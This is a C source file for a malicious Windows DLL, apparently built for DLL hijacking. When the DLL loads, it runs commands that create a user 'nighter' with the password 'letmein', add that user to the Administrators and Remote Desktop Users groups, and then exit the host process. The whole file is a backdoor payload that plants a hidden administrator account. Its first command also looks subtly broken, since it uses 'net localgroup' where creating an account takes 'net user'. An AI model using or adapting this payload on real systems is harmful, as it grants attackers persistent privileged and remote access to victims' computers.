
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup nighter letmein /add");
        system("cmd.exe /k net localgroup administrators nighter /add");
        system("cmd.exe /k net localgroup \"Remote Desktop Users\" nighter  /add");
        ExitProcess(0);
    }
    return TRUE;
}